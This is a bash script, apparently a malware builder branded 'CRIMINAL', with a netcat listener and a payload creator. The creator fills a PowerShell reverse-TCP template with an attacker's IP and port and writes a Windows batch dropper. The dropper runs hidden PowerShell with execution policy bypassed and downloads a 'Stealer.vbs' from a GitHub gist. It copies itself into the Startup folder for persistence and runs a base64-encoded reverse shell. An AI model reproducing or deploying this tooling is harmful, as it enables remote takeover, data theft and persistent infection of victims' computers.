#!/bin/bash/

trap 'printf "\n";stop;exit 1' 2
clear
printf "\e[1;31m ██████╗██████╗ ██╗███╗   ███╗██╗███╗   ██╗ █████╗ ██╗     \e[0m\n"
printf "\e[1;31m██╔════╝██╔══██╗██║████╗ ████║██║████╗  ██║██╔══██╗██║     \e[0m\n"
printf "\e[1;31m██║     ██████╔╝██║██╔████╔██║██║██╔██╗ ██║███████║██║     \e[0m\n"
printf "\e[1;31m██║     ██╔══██╗██║██║╚██╔╝██║██║██║╚██╗██║██╔══██║██║     \e[0m\n"
printf "\e[1;31m╚██████╗██║  ██║██║██║ ╚═╝ ██║██║██║ ╚████║██║  ██║███████╗\e[0m\n"
printf "\e[1;31m ╚═════╝╚═╝  ╚═╝╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝\e[0m\n"

command -v pwsh > /dev/null 2>&1 || { printf >&2 "\e[1;93mI require pwsh but it's not installed.Install it.Aborting.\napt install pwsh -y\n\e[0m"; exit 1; }
command -v nc > /dev/null 2>&1 || { printf >&2 "\e[1;93mI require netcat but it's not installed.Install it.Aborting.\napt install netcat -y\n\e[0m"; exit 1; }

echo ""
echo ""

printf "\e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;36m The Listener \e[0m\n"
printf "\e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;36m The Creator \e[0m\n"

read -p $'\n\e[1;93mEnter The Option : \e[0m' menu


if [[ $menu == 01 || $menu == 1 ]]
then
read -p $'\e\n[1;93mEnter The Port:\e[0m' port
echo""
printf "cat Leaked.txt\n" | nc -klp $port
sleep 1


elif [[ $menu == 02 || $menu == 2  ]]
then
echo""
read -p $'\e\n[1;32mEnte The Output Name: \e[0m' ps_tcp
read -p $'\e\n[1;32mEnter The IpAdress:\e[0m' ip
read -p $'\e\n[1;32mEnter The Port:\e[0m' port
sed -i 's/_ipaddress_/'$ip'/g' powershell_reverse_tcp.txt
sed -i 's/_port_/'$port'/g' powershell_reverse_tcp.txt
printf "\e\n[1;93m^_^ Coverting Powershell File(.ps1) To Batch File(.bat) ^_^\e[0m\n"
sleep 1
echo -e "@echo off " >> $ps_tcp.bat
echo -e "cd %temp%" >> $ps_tcp.bat
echo -e '''powershell -noexit -nologo -win hidden -ExecutionPolicy bypass -NoProfile;wget -o Stealer.vbs "https://gist.githubusercontent.com/darkuser744/1b307ea87dda596ea95b3e0053f59962/raw/e039823f7e11e92d6db5f80b13b7a159eb66b22a/.txt"''' >> $ps_tcp.bat
echo -e '''copy %0 "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"''' >> $ps_tcp.bat
echo -e "start Stealer.vbs " >> $ps_tcp.bat
echo -e "powershell -noexit -nologo -win hidden -ExecutionPolicy bypass -NoProfile -EncodedCommand " >> $ps_tcp.bat;pwsh -c "[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes([IO.File]::ReadAllText('powershell_reverse_tcp.txt')))" >> $ps_tcp.bat
echo -e "exit /b" >> $ps_tcp.bat
sleep 1
printf "\e[1;36m Payload Is Created SuccessFully.\e[0m\n"
sleep 1
printf "\e\n[1;32m Output Path\e[0m \e[1;31m$(pwd)/$ps_tcp.bat\e[0m"
read -p $'\n\e[1;96m Did You Need To Listen???[Y/N] : \e[0m' Option
	if [[ $Option == Y || $Option == y ]]
	then
	printf "cat Leaked.txt\n" | nc -klp $port
	sleep 1
	elif [[ $Option == N || $Option == n ]]
	then
	exit
	else
	printf "\e\n[1;5;31m-+-+-+-+-+-+-+-+--+-\e[0m\n"
	printf "\e\n[1;5;31m-+-Invalid Option-+-\e[0m\n"
	printf "\e\n[1;5;31m-+-+-+-+-+-+-+-+--+-\e[0m\n"
	fi
else
printf "\e\n[1;5;31m-+-+-+-+-+-+-+-+--+-\e[0m\n"
printf "\e\n[1;5;31m-+-Invalid Option-+-\e[0m\n"
printf "\e\n[1;5;31m-+-+-+-+-+-+-+-+--+-\e[0m\n"
sleep 3
fi

